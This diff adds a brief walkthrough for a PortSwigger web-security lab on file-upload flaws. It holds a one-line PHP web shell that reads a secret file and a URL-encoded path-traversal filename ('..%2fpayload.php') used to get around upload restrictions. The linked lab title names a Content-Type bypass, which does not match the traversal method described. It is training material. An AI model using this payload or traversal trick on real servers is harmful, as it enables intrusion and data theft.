@@ -1,0 +1,6 @@
+# Lab link: https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities/exploiting-flawed-validation-of-file-uploads/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
+
+1. Login at /login using credentials: "wiener:peter"
+2. Upload php payload: "<?php echo file_get_contents('/home/carlos/secret'); ?>", at /my-account/avatar & capture the reques in BurpSuite
+3. Change the value of "filename" field to "..%2fpayload.php"
+4. Access your malicious file at "/files/payload.php", to read the "/home/carlos/secret" from web server
